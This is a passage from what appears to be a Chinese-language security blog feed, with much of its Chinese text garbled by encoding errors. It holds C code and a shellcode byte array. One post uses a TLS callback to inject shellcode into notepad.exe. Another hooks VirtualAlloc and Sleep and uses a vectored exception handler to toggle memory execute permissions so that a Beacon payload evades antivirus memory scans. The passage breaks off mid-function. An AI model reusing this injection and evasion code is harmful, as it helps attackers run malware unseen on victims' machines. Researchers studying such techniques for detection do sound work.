class="number">0x48</span>, <span class="number">0xc1</span>, <span class="number">0xe9</span>, <span class="number">0x08</span>, <span class="number">0x8b</span>, <span class="number">0x14</span>, <span class="number">0x0b</span>, <span class="number">0x4c</span>, <span class="number">0x01</span>, <span class="number">0xc2</span>, <span class="number">0x4d</span>, <span class="number">0x31</span>, <span class="number">0xd2</span>, <span class="number">0x44</span>,</span><br><span class="line">	<span class="number">0x8b</span>, <span class="number">0x52</span>, <span class="number">0x1c</span>, <span class="number">0x4d</span>, <span class="number">0x01</span>, <span class="number">0xc2</span>, <span class="number">0x4d</span>, <span class="number">0x31</span>, <span class="number">0xdb</span>, <span class="number">0x44</span>, <span class="number">0x8b</span>, <span class="number">0x5a</span>, <span class="number">0x20</span>, <span class="number">0x4d</span>, <span class="number">0x01</span>, <span class="number">0xc3</span>, <span class="number">0x4d</span>, <span class="number">0x31</span>, <span class="number">0xe4</span>, <span class="number">0x44</span>,</span><br><span class="line">	<span class="number">0x8b</span>, <span class="number">0x62</span>, <span class="number">0x24</span>, <span class="number">0x4d</span>, <span class="number">0x01</span>, <span class="number">0xc4</span>, <span class="number">0xeb</span>, <span class="number">0x32</span>, <span class="number">0x5b</span>, <span class="number">0x59</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe2</span>, <span class="number">0x51</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x0c</span>,</span><br><span class="line">	<span class="number">0x24</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xff</span>, <span class="number">0x41</span>, <span class="number">0x8b</span>, <span class="number">0x3c</span>, <span class="number">0x83</span>, <span class="number">0x4c</span>, <span class="number">0x01</span>, <span class="number">0xc7</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xd6</span>, <span class="number">0xf3</span>, <span class="number">0xa6</span>, <span class="number">0x74</span>, <span class="number">0x05</span>, <span class="number">0x48</span>, <span class="number">0xff</span>,</span><br><span class="line">	<span class="number">0xc0</span>, <span class="number">0xeb</span>, <span class="number">0xe6</span>, <span class="number">0x59</span>, <span class="number">0x66</span>, <span class="number">0x41</span>, <span class="number">0x8b</span>, <span class="number">0x04</span>, <span class="number">0x44</span>, <span class="number">0x41</span>, <span class="number">0x8b</span>, <span class="number">0x04</span>, <span class="number">0x82</span>, <span class="number">0x4c</span>, <span class="number">0x01</span>, <span class="number">0xc0</span>, <span class="number">0x53</span>, <span class="number">0xc3</span>, <span class="number">0x48</span>, <span class="number">0x31</span>,</span><br><span class="line">	<span class="number">0xc9</span>, <span class="number">0x80</span>, <span class="number">0xc1</span>, <span class="number">0x07</span>, <span class="number">0x48</span>, <span class="number">0xb8</span>, <span class="number">0x0f</span>, <span class="number">0xa8</span>, <span class="number">0x96</span>, <span class="number">0x91</span>, <span class="number">0xba</span>, <span class="number">0x87</span>, <span class="number">0x9a</span>, <span class="number">0x9c</span>, <span class="number">0x48</span>, <span class="number">0xf7</span>, <span class="number">0xd0</span>, <span class="number">0x48</span>, <span class="number">0xc1</span>, <span class="number">0xe8</span>,</span><br><span class="line">	<span class="number">0x08</span>, <span class="number">0x50</span>, <span class="number">0x51</span>, <span class="number">0xe8</span>, <span class="number">0xb0</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xc6</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>, <span class="number">0x48</span>, <span class="number">0xf7</span>, <span class="number">0xe1</span>, <span class="number">0x50</span>, <span class="number">0x48</span>, <span class="number">0xb8</span>,</span><br><span class="line">	<span class="number">0x9c</span>, <span class="number">0x9e</span>, <span class="number">0x93</span>, <span class="number">0x9c</span>, <span class="number">0xd1</span>, <span class="number">0x9a</span>, <span class="number">0x87</span>, <span class="number">0x9a</span>, <span class="number">0x48</span>, <span class="number">0xf7</span>, <span class="number">0xd0</span>, <span class="number">0x50</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe1</span>, <span class="number">0x48</span>, <span class="number">0xff</span>, <span class="number">0xc2</span>, <span class="number">0x48</span>, <span class="number">0x83</span>,</span><br><span class="line">	<span class="number">0xec</span>, <span class="number">0x20</span>, <span class="number">0x41</span>, <span class="number">0xff</span>, <span class="number">0xd6</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">DWORD PID;</span><br><span class="line"><span class="type">void</span> NTAPI __stdcall <span class="title function_">TLSCallbacks</span><span class="params">(PVOID DllHandle, DWORD dwReason, PVOID Reserved)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (dwReason == DLL_PROCESS_ATTACH)</span><br><span class="line">	&#123;</span><br><span class="line">		HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">		PROCESSENTRY32 pe;</span><br><span class="line">		pe.dwSize = <span class="keyword">sizeof</span> pe;</span><br><span class="line"></span><br><span class="line">		<span class="type">int</span> PID = FindProcessID(<span class="string">L&quot;notepad.exe&quot;</span>);</span><br><span class="line"></span><br><span class="line">		HANDLE hMapping = CreateFileMapping(INVALID_HANDLE_VALUE, <span class="literal">NULL</span>, PAGE_EXECUTE_READWRITE, <span class="number">0</span>, <span class="keyword">sizeof</span>(CalcShellcode), <span class="literal">NULL</span>);</span><br><span class="line">		LPVOID lpMapAddress = MapViewOfFile(hMapping, FILE_MAP_WRITE, <span class="number">0</span>, <span class="number">0</span>, <span class="keyword">sizeof</span>(CalcShellcode));</span><br><span class="line"></span><br><span class="line">		<span class="built_in">memcpy</span>((PVOID)lpMapAddress, CalcShellcode, <span class="keyword">sizeof</span>(CalcShellcode));</span><br><span class="line"></span><br><span class="line">		HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);</span><br><span class="line">		<span class="keyword">if</span> (!hProcess) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;OpenProcess Error:%d\n&quot;</span>, GetLastError());</span><br><span class="line">			<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		LPVOID lpMapAddressRemote = MapViewOfFile2(hMapping, hProcess, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>, PAGE_EXECUTE_READ);</span><br><span class="line">		<span class="keyword">if</span> (!lpMapAddressRemote) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;MapViewOfFile2 Error:%d\n&quot;</span>, GetLastError());</span><br><span class="line">			<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		HANDLE hRemoteThread = CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)lpMapAddressRemote, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">		<span class="keyword">if</span> (!hRemoteThread) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot; CreateRemoteThread Error:%d\n&quot;</span>, GetLastError());</span><br><span class="line">			<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		UnmapViewOfFile(lpMapAddress);</span><br><span class="line">		CloseHandle(hMapping);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	MessageBoxA(<span class="literal">NULL</span>, (LPCSTR)<span class="string">&quot;TLS Callback before main :)&quot;</span>, (LPCSTR)<span class="string">&quot;TLS Callback&quot;</span>, <span class="number">0</span>);</span><br><span class="line">	ExitProcess(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD <span class="title function_">FindProcessID</span><span class="params">(LPCTSTR ProcessName)</span> &#123;</span><br><span class="line">	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">	PROCESSENTRY32 process = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	process.dwSize = <span class="keyword">sizeof</span>(process);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (Process32First(snapshot, &amp;process)) &#123;</span><br><span class="line">		<span class="keyword">do</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> (!wcscmp(process.szExeFile, (<span class="type">const</span> <span class="type">wchar_t</span>*)ProcessName))</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125; <span class="keyword">while</span> (Process32Next(snapshot, &amp;process));</span><br><span class="line">	&#125;</span><br><span class="line">	CloseHandle(snapshot);</span><br><span class="line">	<span class="keyword">return</span> process.th32ProcessID;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Main function but  never be executed :(&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨Unicodeå­—ç¬¦é›† ä¸ç„¶æ‰¾ä¸åˆ°PID..</p>
<h4 id="References"><a href="#References" class="headerlink" title="References"></a>References</h4><p><a href="https://idiotc4t.com/code-and-dll-process-injection/tls-code-execute">https://idiotc4t.com/code-and-dll-process-injection/tls-code-execute</a></p>
<p><a href="https://dmcxblue.gitbook.io/red-team-notes-2-0/red-team-techniques/defense-evasion/t1055-process-injection/thread-local-storage">https://dmcxblue.gitbook.io/red-team-notes-2-0/red-team-techniques/defense-evasion/t1055-process-injection/thread-local-storage</a></p>
<p><a href="https://medium.com/@aragornSec/thread-local-storage-197f9a3f4fe3">https://medium.com/@aragornSec/thread-local-storage-197f9a3f4fe3</a></p>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/procthread/thread-local-storage">https://learn.microsoft.com/en-us/windows/win32/procthread/thread-local-storage</a></p>
<p>[<a href="https://lzeroyuee.cn/old-blog/TLS%E5%9B%9E%E8%B0%83%20-%20lZeroyuee&#39;s%20Blog.html]">https://lzeroyuee.cn/old-blog/TLS%E5%9B%9E%E8%B0%83%20-%20lZeroyuee&#39;s%20Blog.html]</a>(<a href="https://lzeroyuee.cn/old-blog/TLS%E5%9B%9E%E8%B0%83">https://lzeroyuee.cn/old-blog/TLSå›è°ƒ</a> - lZeroyueeâ€™s Blog.html)</p>
<p><a href="https://bbs.kanxue.com/thread-267175.htm#msg_header_h1_4">https://bbs.kanxue.com/thread-267175.htm#msg_header_h1_4</a></p>
]]></content>
      <categories>
        <category>TLS</category>
      </categories>
      <tags>
        <tag>TLS</tag>
      </tags>
  </entry>
  <entry>
    <title>VEHå¼‚å¸¸å¤„ç†è§„é¿å†…å­˜æ‰«æ</title>
    <url>/posts/18c2f5df/</url>
    <content><![CDATA[<h4 id="å®ç°æ€è·¯"><a href="#å®ç°æ€è·¯" class="headerlink" title="å®ç°æ€è·¯"></a>å®ç°æ€è·¯</h4><p>AVåœ¨æ‰«æè¿›ç¨‹ç©ºé—´æ—¶ï¼Œå¹¶ä¸ä¼šæ‰«ææ‰€æœ‰çš„å†…å­˜ç©ºé—´ï¼Œåªä¼šæ‰«ææ•æ„Ÿçš„å†…å­˜åŒºåŸŸã€Œå¯æ‰§è¡ŒåŒºåŸŸã€ã€‚</p>
<p>æ€è·¯å°±æ˜¯ä¸æ–­æ”¹å˜æŸä¸€å—å†…å­˜å±æ€§ï¼Œå½“åº”æ‰§è¡Œå‘½ä»¤æˆ–æŸäº›æ“ä½œæ—¶ï¼Œæ‰§è¡Œçš„å†…å­˜å±æ€§ä¸ºå¯æ‰§è¡Œï¼Œå½“åŠŸèƒ½æ¨¡å—è¿›å…¥ç¡çœ çŠ¶æ€ï¼Œåˆ™å†…å­˜å±æ€§æ”¹ä¸ºä¸å¯æ‰§è¡Œã€‚å½“æ‰§è¡Œçš„åœ°å€ç©ºé—´ä¸ºä¸å¯æ‰§è¡Œæ—¶ï¼Œå¦‚æœå¼ºåˆ¶æ‰§è¡Œå°±ä¼šè¿”å›0xc0000005å¼‚å¸¸ã€‚éšåé€šè¿‡VEHå»æ•è·è¯¥å¼‚å¸¸ï¼Œå³æ ¹æ®éœ€æ±‚åŠ¨æ€çš„æ”¹å˜å†…å­˜å±æ€§ï¼Œä»è€Œè§„é¿å†…å­˜æ‰«æã€‚</p>
<h4 id="ä»£ç å®ç°"><a href="#ä»£ç å®ç°" class="headerlink" title="ä»£ç å®ç°"></a>ä»£ç å®ç°</h4><p>é¦–å…ˆ Hook VirtualAlloc å’Œ Sleepå‡½æ•°</p>
<h5 id="Hook-VirtualAlloc"><a href="#Hook-VirtualAlloc" class="headerlink" title="Hook VirtualAlloc"></a>Hook VirtualAlloc</h5><p>è¯»å–èµ·å§‹åœ°å€å’Œå†…å­˜å¤§å°  ä¾¿äºåç»­ä¿®æ”¹å†…å­˜å±æ€§</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">CHAR g_OldSleepData[<span class="number">5</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">LPVOID OldVirtualAlloc = GetProcAddress(GetModuleHandleA(<span class="string">&quot;kernel32.dll&quot;</span>), <span class="string">&quot;VirtualAlloc&quot;</span>);</span><br><span class="line"></span><br><span class="line">LPVOID WINAPI <span class="title function_">NewVirtualAlloc</span><span class="params">(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)</span> &#123;</span><br><span class="line">	unHookVirtualAlloc();</span><br><span class="line">	BASE_ADDRESS = VirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect);</span><br><span class="line">	g_dwSize = dwSize;</span><br><span class="line">	HookVirtualAlloc();</span><br><span class="line">	<span class="keyword">return</span> BASE_ADDRESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">HookVirtualAlloc</span><span class="params">()</span> &#123;</span><br><span class="line">	DWORD dwAllocOldProtect = <span class="literal">NULL</span>;</span><br><span class="line">	BYTE pAllocData[<span class="number">5</span>] = &#123; <span class="number">0xe9</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span> &#125;;</span><br><span class="line">	<span class="comment">//ä¿å­˜åŸæ¥çš„ç¡¬ç¼–ç </span></span><br><span class="line">	RtlCopyMemory(g_OldAllocData, OldVirtualAlloc, <span class="keyword">sizeof</span>(g_OldAllocData));</span><br><span class="line">	<span class="comment">//è®¡ç®—åç§»</span></span><br><span class="line">	DWORD dwAllocOffeset = (DWORD)NewVirtualAlloc - (DWORD)OldVirtualAlloc - <span class="number">5</span>;</span><br><span class="line">	<span class="comment">//å¾—åˆ°å®Œæ•´çš„pAllocData</span></span><br><span class="line">	RtlCopyMemory(&amp;pAllocData[<span class="number">1</span>], &amp;dwAllocOffeset, <span class="keyword">sizeof</span>(dwAllocOffeset));</span><br><span class="line">	<span class="comment">//æ”¹ä¸ºå¯å†™å±æ€§</span></span><br><span class="line">	VirtualProtect(OldVirtualAlloc, <span class="number">5</span>, PAGE_READWRITE, &amp;dwAllocOldProtect);</span><br><span class="line">	<span class="comment">//å°†åç§»åœ°å€å†™å…¥ï¼Œè·³è½¬åˆ°æ–°çš„</span></span><br><span class="line">	RtlCopyMemory(OldVirtualAlloc, pAllocData, <span class="keyword">sizeof</span>(pAllocData));</span><br><span class="line">	<span class="comment">//è¿˜åŸå±æ€§</span></span><br><span class="line">	VirtualProtect(OldVirtualAlloc, <span class="number">5</span>, dwAllocOldProtect, &amp;dwAllocOldProtect);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">unHookVirtualAlloc</span><span class="params">()</span> &#123;</span><br><span class="line">	DWORD dwOldProtect = <span class="literal">NULL</span>;</span><br><span class="line">	VirtualProtect(OldVirtualAlloc, <span class="number">5</span>, PAGE_READWRITE, &amp;dwOldProtect);</span><br><span class="line">	<span class="comment">//è¿˜åŸç¡¬ç¼–ç </span></span><br><span class="line">	RtlCopyMemory(OldVirtualAlloc, g_OldAllocData, <span class="keyword">sizeof</span>(g_OldAllocData));</span><br><span class="line">	<span class="comment">//è¿˜åŸå±æ€§</span></span><br><span class="line">	VirtualProtect(OldVirtualAlloc, <span class="number">5</span>, dwOldProtect, &amp;dwOldProtect);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="Hook-Sleep"><a href="#Hook-Sleep" class="headerlink" title="Hook Sleep"></a>Hook Sleep</h5><p>åœ¨Beaconè¿›å…¥sleepæ—¶ å³åˆ»å–æ¶ˆBeaconå†…å­˜åŒºåŸŸçš„Xå±æ€§</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">CHAR g_OldSleepData[<span class="number">5</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">LPVOID OldSleep = GetProcAddress(GetModuleHandleA(<span class="string">&quot;kernel32.dll&quot;</span>), <span class="string">&quot;Sleep&quot;</span>);</span><br><span class="line"></span><br><span class="line">VOID WINAPI <span class="title function_">NewSleep</span><span class="params">(DWORD dwMilliseconds)</span> &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Sleep:%d\n&quot;</span>, dwMilliseconds);</span><br><span class="line">	unHookSleep();</span><br><span class="line">	Sleep(dwMilliseconds);</span><br><span class="line">	HookSleep();</span><br><span class="line">	SetEvent(hEvent);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">HookSleep</span><span class="params">()</span> &#123;</span><br><span class="line">	DWORD OldSleepProtect = <span class="literal">NULL</span>;</span><br><span class="line">	BYTE pSleepData[<span class="number">5</span>] = &#123; <span class="number">0xe9</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="comment">//ä¿å­˜SleepåŸç¼–ç </span></span><br><span class="line">	RtlCopyMemory(g_OldSleepData, OldSleep, <span class="keyword">sizeof</span>(g_OldSleepData));</span><br><span class="line">	<span class="comment">//è®¡ç®—åç§»</span></span><br><span class="line">	DWORD SleepOffest = (DWORD)NewSleep - (DWORD)OldSleep - <span class="number">5</span>;</span><br><span class="line">	<span class="comment">//å¾—åˆ°pSleepData</span></span><br><span class="line">	RtlCopyMemory(&amp;pSleepData[<span class="number">1</span>], &amp;SleepOffest, <span class="keyword">sizeof</span>(pSleepData));</span><br><span class="line">	<span class="comment">//ä¿®æ”¹å†…å­˜å±æ€§å¯å†™ï¼Œä¿å­˜åŸå…ˆå†…å­˜å±æ€§åˆ°OldSleepProtect</span></span><br><span class="line">	VirtualProtect(OldSleep, <span class="number">5</span>, PAGE_EXECUTE_READWRITE, &amp;OldSleepProtect);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//ä¿®æ”¹å®Œçš„pSleepDataè¦†ç›–æ‰åŸå§‹çš„Sleep</span></span><br><span class="line">	RtlCopyMemory(OldSleep, pSleepData, <span class="keyword">sizeof</span>(pSleepData));</span><br><span class="line"></span><br><span class="line">	<span class="comment">//ä¿®æ”¹ä¸ºåŸå†…å­˜å±æ€§</span></span><br><span class="line">	VirtualProtect(OldSleep, <span class="number">5</span>, OldSleepProtect, &amp;OldSleepProtect);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">unHookSleep</span><span class="params">()</span> &#123;</span><br><span class="line">	DWORD dwOldProtect = <span class="literal">NULL</span>;</span><br><span class="line">	VirtualProtect(OldSleep, <span class="number">5</span>, PAGE_READWRITE, &amp;dwOldProtect);</span><br><span class="line">	<span class="comment">//è¿˜åŸç¡¬ç¼–ç </span></span><br><span class="line">	RtlCopyMemory(OldSleep, g_OldSleepData, <span class="keyword">sizeof</span>(g_OldSleepData));</span><br><span class="line">	<span class="comment">//è¿˜åŸå±æ€§</span></span><br><span class="line">	VirtualProtect(OldSleep, <span class="number">5</span>, dwOldProtect, &amp;dwOldProtect);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="VEHå¼‚å¸¸å¤„ç†"><a href="#VEHå¼‚å¸¸å¤„ç†" class="headerlink" title="VEHå¼‚å¸¸å¤„ç†"></a>VEHå¼‚å¸¸å¤„ç†</h5><p>å¦‚æœå†…å­˜å±æ€§ä¸ºä¸å¯æ‰§è¡ŒçŠ¶æ€å»æ‰§è¡Œçš„è¯ï¼Œå°±ä¼šæŠ¥å‡ºå¼‚å¸¸0xc0000005ï¼Œå¯ä»¥é€šè¿‡<code>ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode == 0xc0000005</code>è¿›è¡Œåˆ¤æ–­ã€‚éšåä½¿ç”¨<code>is_Exception</code> åˆ¤æ–­æŠ¥é”™ä½ç½®æ˜¯å¦åœ¨ç”³è¯·çš„å†…å­˜åŒºåŸŸä¸­ï¼Œå¦‚æœæœ‰åœ¨èµ‹äºˆå¯æ‰§è¡Œå±æ€§</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//åˆ¤æ–­æŠ¥é”™ä½ç½®æ˜¯å¦åœ¨ç”³è¯·çš„å†…å­˜åŒºåŸŸä¸­ï¼Œå¦‚æœæœ‰åœ¨èµ‹äºˆå¯æ‰§è¡Œå±æ€§</span></span><br><span class="line">BOOL <span class="title function_">is_Exception</span><span class="params">(DWORD ExceptionInfo_EIP)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (ExceptionInfo_EIP &lt; ((DWORD)BASE_ADDRESS + dwSize_Gloab) &amp;&amp; ExceptionInfo_EIP &gt;= (DWORD)BASE_ADDRESS)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;åœ°å€ç¬¦åˆ:%x\n&quot;</span>, ExceptionInfo_EIP);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;åœ°å€ä¸ç¬¦åˆ:%x\n&quot;</span>, ExceptionInfo_EIP);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">LONG WINAPI <span class="title function_">VectoredExceptionHandler</span><span class="params">(PEXCEPTION_POINTERS ExceptionInfo)</span>&#123;</span><br><span class="line">	<span class="comment">//printf(&quot;å¼‚å¸¸é”™è¯¯ç :%x\n&quot;, ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode);</span></span><br><span class="line">	<span class="comment">//printf(&quot;çº¿ç¨‹åœ°å€:%lx\n&quot;, ExceptionInfo-&gt;ContextRecord-&gt;Eip);</span></span><br><span class="line">	<span class="keyword">if</span> (ExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode == <span class="number">0xc0000005</span> &amp;&amp; is_Exception(ExceptionInfo-&gt;ContextRecord-&gt;Eip)) &#123;</span><br><span class="line">		<span class="comment">//printf(&quot;æ¢å¤å¯æ‰§è¡Œå†…å­˜å±æ€§\n&quot;);</span></span><br><span class="line">		VirtualProtect(BASE_ADDRESS, dwSize_Gloab, PAGE_EXECUTE_READWRITE, &amp;Beacon_OldProtect);</span><br><span class="line">		<span class="keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> EXCEPTION_CONTINUE_SEARCH;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="å®Œæ•´ä»£ç "><a href="#å®Œæ•´ä»£ç " class="headerlink" title="å®Œæ•´ä»£ç "></a>å®Œæ•´ä»£ç </h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WinInet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;WinInet.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line">CHAR g_OldAllocData[<span class="number">5</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">CHAR g_OldSleepData[<span class="number">5</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">LPVOID BASE_ADDRESS;</span><br><span class="line">SIZE_T g_dwSize;</span><br><span class="line">DWORD Beacon_OldProtect;</span><br><span class="line">HANDLE hEvent;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">HookVirtualAlloc</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">unHookVirtualAlloc</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">HookSleep</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">unHookSleep</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">LPVOID OldSleep = GetProcAddress(GetModuleHandleA(<span class="string">&quot;kernel32.dll&quot;</span>), <span class="string">&quot;Sleep&quot;</span>);</span><br><span class="line">LPVOID OldVirtualAlloc = GetProcAddress(GetModuleHandleA(<span class="string">&quot;kernel32.dll&quot;</span>), <span class="string">&quot;VirtualAlloc&quot;</span>);</span><br><span class="line"></span><br><span class="line">VOID WINAPI <span class="title function_">NewSleep</span><span class="params">(DWORD dwMilliseconds)</span> &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Sleep:%d\n&quot;</span>, dwMilliseconds);</span><br><span class="line">	unHookSleep();</span><br><span class="line">	Sleep(dwMilliseconds);</span><br><span class="line">	HookSleep();</span><br><span class="line">	SetEvent(hEvent);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">LPVOID WINAPI <span class="title function_">NewVirtualAlloc</span><span class="params">(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)</span> &#123;</span><br><span class="line">	unHookVirtualAlloc();</span><br><span class="line">	BASE_ADDRESS = VirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect);</span><br><span class="line">	g_dwSize = dwSize;</span><br><span class="line">	HookVirtualAlloc();</span><br><span class="line">	<span class="keyword">return</span> BASE_ADDRESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å‚è€ƒinlinehookä»£ç </span></span><br><span class="line"><span class="type">void</span> <span class="title function_">HookVirtualAlloc</span><span class="params">()</span> &#123;</span><br><span class="line">	DWORD dwAllocOldProtect = <span class="literal">NULL</span>;</span><br><span class="line">	BYTE pAllocData[<span class="number">5</span>] = &#123; <span class="number">0xe9</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span> &#125;;</span><br><span class="line">	<span class="comment">//ä¿å­˜åŸæ¥çš„ç¡¬ç¼–ç </span></span><br><span class="line">	RtlCopyMemory(g_OldAllocData, OldVirtualAlloc, <span class="keyword">sizeof</span>(g_OldAllocData));</span><br><span class="line">	<span class="comment">//è®¡ç®—åç§»</span></span><br><span class="line">	DWORD dwAllocOffeset = (DWORD)NewVirtualAlloc - (DWORD)OldVirtualAlloc - <span class="number">5</span>;</span><br><span class="line">	<span class="comment">//å¾—åˆ°å®Œæ•´çš„pAllocData</span></span><br><span class="line">	RtlCopyMemory(&amp;pAllocData[<span class="number">1</span>], &amp;dwAllocOffeset, <span class="keyword">sizeof</span>(dwAllocOffeset));</span><br><span class="line">	<span class="comment">//æ”¹ä¸ºå¯å†™å±æ€§</span></span><br><span class="line">	VirtualProtect(OldVirtualAlloc, <span class="number">5</span>, PAGE_READWRITE, &amp;dwAllocOldProtect);</span><br><span class="line">	<span class="comment">//å°†åç§»åœ°å€å†™å…¥ï¼Œè·³è½¬åˆ°æ–°çš„</span></span><br><span class="line">	RtlCopyMemory(OldVirtualAlloc, pAllocData, <span class="keyword">sizeof</span>(pAllocData));</span><br><span class="line">	<span class="comment">//è¿˜åŸå±æ€§</span></span><br><span class="line">	VirtualProtect(OldVirtualAlloc, <span class="number">5</span>, dwAllocOldProtect, &amp;dwAllocOldProtect);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">unHookVirtualAlloc</span><span class="params">()</span> &#123;</span><br><span class="line">	DWORD dwOldProtect = <span class="literal">NULL</span>;</span><br><span class="line">	VirtualProtect(OldVirtualAlloc, <span class="number">5</span>, PAGE_READWRITE, &amp;dwOldProtect);</span><br><span class="line">	<span class="comment">//è¿˜åŸç¡¬ç¼–ç </span></span><br><span class="line">	RtlCopyMemory(OldVirtualAlloc, g_OldAllocData, <span class="keyword">sizeof</span>(g_OldAllocData));</span><br><span class="line">	<span class="comment">//è¿˜åŸå±æ€§</span></span><br><span class="line">	VirtualProtect(OldVirtualAlloc, <span class="number">5</span>, dwOldProtect, &amp;dwOldProtect);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">HookSleep</span><span class="params">()</span> &#123;</span><br><span class="line">	DWORD OldSleepProtect = <span class="literal">NULL</span>;</span><br><span class="line">	BYTE pSleepData[<span class="number">5</span>] = &#123; <span class="number">0xe9</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="comment">//ä¿å­˜SleepåŸç¼–ç </span></span><br><span class="line">	RtlCopyMemory(g_OldSleepData, OldSleep, 